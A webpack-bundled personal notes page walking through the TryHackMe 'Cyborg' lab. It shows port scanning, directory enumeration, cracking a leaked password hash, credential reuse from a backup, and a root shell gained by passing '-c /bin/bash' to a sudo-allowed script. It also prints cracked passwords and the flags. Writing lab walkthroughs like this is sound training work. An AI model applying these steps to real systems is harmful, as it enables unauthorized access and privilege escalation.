"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[53931],{15680:(e,a,t)=>{t.d(a,{xA:()=>p,yg:()=>h});var n=t(96540);function r(e,a,t){return a in e?Object.defineProperty(e,a,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[a]=t,e}function o(e,a){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);a&&(n=n.filter((function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),t.push.apply(t,n)}return t}function s(e){for(var a=1;a<arguments.length;a++){var t=null!=arguments[a]?arguments[a]:{};a%2?o(Object(t),!0).forEach((function(a){r(e,a,t[a])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(a){Object.defineProperty(e,a,Object.getOwnPropertyDescriptor(t,a))}))}return e}function i(e,a){if(null==e)return{};var t,n,r=function(e,a){if(null==e)return{};var t,n,r={},o=Object.keys(e);for(n=0;n<o.length;n++)t=o[n],a.indexOf(t)>=0||(r[t]=e[t]);return r}(e,a);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(n=0;n<o.length;n++)t=o[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=n.createContext({}),c=function(e){var a=n.useContext(l),t=a;return e&&(t="function"==typeof e?e(a):s(s({},a),e)),t},p=function(e){var a=c(e.components);return n.createElement(l.Provider,{value:a},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var a=e.children;return n.createElement(n.Fragment,{},a)}},g=n.forwardRef((function(e,a){var t=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),u=c(t),g=r,h=u["".concat(l,".").concat(g)]||u[g]||m[g]||o;return t?n.createElement(h,s(s({ref:a},p),{},{components:t})):n.createElement(h,s({ref:a},p))}));function h(e,a){var t=arguments,r=a&&a.mdxType;if("string"==typeof e||r){var o=t.length,s=new Array(o);s[0]=g;var i={};for(var l in a)hasOwnProperty.call(a,l)&&(i[l]=a[l]);i.originalType=e,i[u]="string"==typeof e?e:r,s[1]=i;for(var c=2;c<o;c++)s[c]=t[c];return n.createElement.apply(null,s)}return n.createElement.apply(null,t)}g.displayName="MDXCreateElement"},53754:(e,a,t)=>{t.r(a),t.d(a,{assets:()=>l,contentTitle:()=>s,default:()=>m,frontMatter:()=>o,metadata:()=>i,toc:()=>c});var n=t(58168),r=(t(96540),t(15680));const o={title:"Cyborg"},s=void 0,i={unversionedId:"hacker/tryhackme/cyborg",id:"hacker/tryhackme/cyborg",title:"Cyborg",description:"These are my notes for the Cyborg Room on TryHackMe.",source:"@site/docs/hacker/tryhackme/cyborg.md",sourceDirName:"hacker/tryhackme",slug:"/hacker/tryhackme/cyborg",permalink:"/docs/hacker/tryhackme/cyborg",draft:!1,editUrl:"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/tryhackme/cyborg.md",tags:[],version:"current",frontMatter:{title:"Cyborg"},sidebar:"docsSidebar",previous:{title:"Corp",permalink:"/docs/hacker/tryhackme/corp"},next:{title:"Gatekeeper",permalink:"/docs/hacker/tryhackme/gatekeeper"}},l={},c=[{value:"RECON",id:"recon",level:2},{value:"Nmap",id:"nmap",level:3},{value:"Gobuster",id:"gobuster",level:3},{value:"Crack",id:"crack",level:2},{value:"Enumerate web folders",id:"enumerate-web-folders",level:2},{value:"archive.tar",id:"archivetar",level:3},{value:"Borg Backup System",id:"borg-backup-system",level:2},{value:"PRIVESC",id:"privesc",level:2},{value:"user.txt",id:"usertxt",level:3},{value:"root.txt",id:"roottxt",level:3}],p={toc:c},u="wrapper";function m(e){let{components:a,...t}=e;return(0,r.yg)(u,(0,n.A)({},p,t,{components:a,mdxType:"MDXLayout"}),(0,r.yg)("admonition",{title:"Description",type:"info"},(0,r.yg)("p",{parentName:"admonition"},"These are my notes for the ",(0,r.yg)("a",{parentName:"p",href:"https://tryhackme.com/room/cyborgt8"},"Cyborg Room")," on TryHackMe."),(0,r.yg)("p",{parentName:"admonition"},"Note: Task #1 is to deploy the machine."),(0,r.yg)("table",{parentName:"admonition"},(0,r.yg)("thead",{parentName:"table"},(0,r.yg)("tr",{parentName:"thead"},(0,r.yg)("th",{parentName:"tr",align:"center"},"OS"),(0,r.yg)("th",{parentName:"tr",align:"center"},"Level"),(0,r.yg)("th",{parentName:"tr",align:"center"},"Rating"))),(0,r.yg)("tbody",{parentName:"table"},(0,r.yg)("tr",{parentName:"tbody"},(0,r.yg)("td",{parentName:"tr",align:"center"},"Windows"),(0,r.yg)("td",{parentName:"tr",align:"center"},"Easy"),(0,r.yg)("td",{parentName:"tr",align:"center"},"5/5"))))),(0,r.yg)("h2",{id:"recon"},"RECON"),(0,r.yg)("h3",{id:"nmap"},"Nmap"),(0,r.yg)("p",null,"From scan ",(0,r.yg)("inlineCode",{parentName:"p"},"nmap -v -sV -p- -o nmap-cyborg.txt 10.10.148.181")),(0,r.yg)("p",null,"I found:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n")),(0,r.yg)("h3",{id:"gobuster"},"Gobuster"),(0,r.yg)("p",null,"results (didnt note the command):"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"http://10.10.19.193/.hta                 (Status: 403) [Size: 277]\nhttp://10.10.19.193/.htaccess            (Status: 403) [Size: 277]\nhttp://10.10.19.193/.htpasswd            (Status: 403) [Size: 277]\nhttp://10.10.19.193/admin                (Status: 301) [Size: 312] [--\x3e http://10.10.19.193/admin/]\nhttp://10.10.19.193/etc                  (Status: 301) [Size: 310] [--\x3e http://10.10.19.193/etc/]\nhttp://10.10.19.193/index.html           (Status: 200) [Size: 11321]\nhttp://10.10.19.193/server-status        (Status: 403) [Size: 277]\n")),(0,r.yg)("p",null,"I browse to ",(0,r.yg)("inlineCode",{parentName:"p"},"http://10.10.19.193/etc/squid/passwd")," and find ",(0,r.yg)("inlineCode",{parentName:"p"},"music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.")),(0,r.yg)("p",null,"Let's crack it."),(0,r.yg)("h2",{id:"crack"},"Crack"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},'\u2514\u2500$ john passwd --wordlist=/usr/share/wordlists/rockyou.txt                                                  130 \u2a2f \nWarning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"                       \nUse the "--format=md5crypt-long" option to force loading these as that type instead                                \nUsing default input encoding: UTF-8                                                                                \nLoaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])                               \nWill run 2 OpenMP threads                                                                                          \nPress \'q\' or Ctrl-C to abort, almost any other key for status                                                      \nsquidward        (music_archive)                                                                                   \n1g 0:00:00:01 DONE (2022-01-15 23:24) 0.6711g/s 26158p/s 26158c/s 26158C/s wonderfull..samantha5                   \nUse the "--show" option to display all of the cracked passwords reliably                                           \nSession completed\n')),(0,r.yg)("p",null,"We have user/password = ",(0,r.yg)("inlineCode",{parentName:"p"},"music_archive/squidward")),(0,r.yg)("h2",{id:"enumerate-web-folders"},"Enumerate web folders"),(0,r.yg)("p",null,"I found ",(0,r.yg)("inlineCode",{parentName:"p"},"squid.conf"),":"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"# http://10.10.19.193/etc/squid/squid.conf\n\nauth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd\nauth_param basic children 5\nauth_param basic realm Squid Basic Authentication\nauth_param basic credentialsttl 2 hours\nacl auth_users proxy_auth REQUIRED\nhttp_access allow auth_users\n")),(0,r.yg)("h3",{id:"archivetar"},"archive.tar"),(0,r.yg)("p",null,"I found archive on ",(0,r.yg)("inlineCode",{parentName:"p"},"view-source:http://10.10.148.181/admin/index.html")," = ",(0,r.yg)("inlineCode",{parentName:"p"},"http://10.10.148.181/admin/archive.tar")),(0,r.yg)("p",null,"downloaded & extracted - contains a BORG archive."),(0,r.yg)("p",null,"might come in handy later:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-sh"},'\u2514\u2500$ strings integrity.5 \nversion\nhints\n@{"algorithm": "XXH64", "digests": {"final": "05178884e81563d7"}}\nindex\nb{"algorithm": "XXH64", "digests": {"HashHeader": "146e9cb969e480a3", "final": "b53737af67235823"}}\n')),(0,r.yg)("p",null,"config file"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-sh"},"[repository]\nversion = 1\nsegments_per_dir = 1000\nmax_segment_size = 524288000\nappend_only = 0\nstorage_quota = 0\nadditional_free_space = 0\nid = ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31\nkey = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV\n        L/2KvB2UL9wHUa9nVV55aAMhyYRarsQWQZwjqhT0MedUEGWP+FQXlFJiCpm4n3myNgHWKj\n        2/y/khvv50yC3gFIdgoEXY5RxVCXhZBtROCwthh6sc3m4Z6VsebTxY6xYOIp582HrINXzN\n        8NZWZ0cQZCFxwkT1AOENIljk/8gryggZl6HaNq+kPxjP8Muz/hm39ZQgkO0Dc7D3YVwLhX\n        daw9tQWil480pG5d6PHiL1yGdRn8+KUca82qhutWmoW1nyupSJxPDnSFY+/4u5UaoenPgx\n        oDLeJ7BBxUVsP1t25NUxMWCfmFakNlmLlYVUVwE+60y84QUmG+ufo5arj+JhMYptMK2lyN\n        eyUMQWcKX0fqUjC+m1qncyOs98q5VmTeUwYU6A7swuegzMxl9iqZ1YpRtNhuS4A5z9H0mb\n        T8puAPzLDC1G33npkBeIFYIrzwDBgXvCUqRHY6+PCxlngzz/QZyVvRMvQjp4KC0Focrkwl\n        vi3rft2Mh/m7mUdmEejnKc5vRNCkaGFzaNoAICDoAxLOsEXy6xetV9yq+BzKRersnWC16h\n        SuQq4smlLgqml0ZXJhdGlvbnPOAAGGoKRzYWx02gAgzFQioCyKKfXqR5j3WKqwp+RM0Zld\n        UCH8bjZLfc1GFsundmVyc2lvbgE=\n")),(0,r.yg)("h2",{id:"borg-backup-system"},"Borg Backup System"),(0,r.yg)("p",null,"the tar is a borg deduplication file/archive ",(0,r.yg)("a",{parentName:"p",href:"https://borgbackup.readthedocs.io/en/stable/index.html"},"borg"),"."),(0,r.yg)("p",null,"the ",(0,r.yg)("a",{parentName:"p",href:"https://borgbackup.readthedocs.io/en/stable/usage/general.html"},"usage")," is e.g. ",(0,r.yg)("inlineCode",{parentName:"p"},"borg list /path/to/archive")),(0,r.yg)("p",null,"for the archive.tar with ",(0,r.yg)("inlineCode",{parentName:"p"},"/home/field/dev"),' the actual "archive" is the folder ',(0,r.yg)("inlineCode",{parentName:"p"},"final_archive"),":"),(0,r.yg)("p",null,"use the passwd we cracked ",(0,r.yg)("inlineCode",{parentName:"p"},"squidward"),":"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/download/home/field/dev]\n\u2514\u2500$ borg list ./final_archive \nEnter passphrase for key /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/CYBORG/download/home/field/dev/final_archive: \nmusic_archive                        Wed, 2020-12-30 03:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]\n")),(0,r.yg)("p",null,"so will try and extract it, see any info in it."),(0,r.yg)("h2",{id:"privesc"},"PRIVESC"),(0,r.yg)("h3",{id:"usertxt"},"user.txt"),(0,r.yg)("p",null,"mounted archive using ",(0,r.yg)("inlineCode",{parentName:"p"},"borg mount ./final_archive /tmp/borg"),", mounts the FUSE filesystem archive at ",(0,r.yg)("inlineCode",{parentName:"p"},"/tmp/borg")," and was the users whole home dir backup. had a look around and found ",(0,r.yg)("inlineCode",{parentName:"p"},"Document\\note.txt")," which had:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"\u2514\u2500$ cat Documents/note.txt\nWow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!\n\nalex:S3cretP@s3\n")),(0,r.yg)("p",null,"use it to ",(0,r.yg)("inlineCode",{parentName:"p"},"ssh alex@10.10.148.181")," and got the ",(0,r.yg)("inlineCode",{parentName:"p"},"user.txt")," flag."),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"alex@ubuntu:~$ cat user.txt \nflag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}\n")),(0,r.yg)("h3",{id:"roottxt"},"root.txt"),(0,r.yg)("p",null,"check what alex can do with ",(0,r.yg)("inlineCode",{parentName:"p"},"sudo"),":"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"alex@ubuntu:~$ sudo -l\nMatching Defaults entries for alex on ubuntu:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser alex may run the following commands on ubuntu:\n    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh\n")),(0,r.yg)("p",null,"looking through the ",(0,r.yg)("inlineCode",{parentName:"p"},"/etc/mp3backups/backup.sh")," and this part looks the most interesting because it's allowing a command to be injected in here, running as root :D"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},'#!/bin/bash\n\n...\n\nwhile getopts c: flag\ndo\n  case "${flag}" in \n    c) command=${OPTARG};;\n  esac\ndone\n\n...\n\n')),(0,r.yg)("p",null,"This ",(0,r.yg)("a",{parentName:"p",href:"https://www.howtogeek.com/778410/how-to-use-getopts-to-parse-linux-shell-script-options/"},"page")," explains how ",(0,r.yg)("inlineCode",{parentName:"p"},"getopts")," works by letting you set the characters used to trigger the cases."),(0,r.yg)("p",null,"I try adding a ",(0,r.yg)("inlineCode",{parentName:"p"},"-c /bin/bash")," to the backup script:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c /bin/bash\n/home/alex/Music/image12.mp3\n/home/alex/Music/image7.mp3\n/home/alex/Music/image1.mp3\n/home/alex/Music/image10.mp3\n/home/alex/Music/image5.mp3\n/home/alex/Music/image4.mp3\n/home/alex/Music/image3.mp3\n/home/alex/Music/image6.mp3\n/home/alex/Music/image8.mp3\n/home/alex/Music/image9.mp3\n/home/alex/Music/image11.mp3\n/home/alex/Music/image2.mp3\nfind: \u2018/run/user/108/gvfs\u2019: Permission denied\nBacking up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz\n\ntar: Removing leading `/' from member names\ntar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory\ntar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory\ntar: Exiting with failure status due to previous errors\n\nBackup finished\nroot@ubuntu:~# \n")),(0,r.yg)("p",null,"because this spawns a shell halfway through the script, the output will be going to some other output, so we don't see the results until I exit out of the shell:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"root@ubuntu:~# id; whoami; cat /root/root.txt\nroot@ubuntu:~# exit\nuid=0(root) gid=0(root) groups=0(root) root flag{Than5s_f0r_play1ng_H0p\xa3_y0u_enJ053d}\n")))}m.isMDXComponent=!0}}]);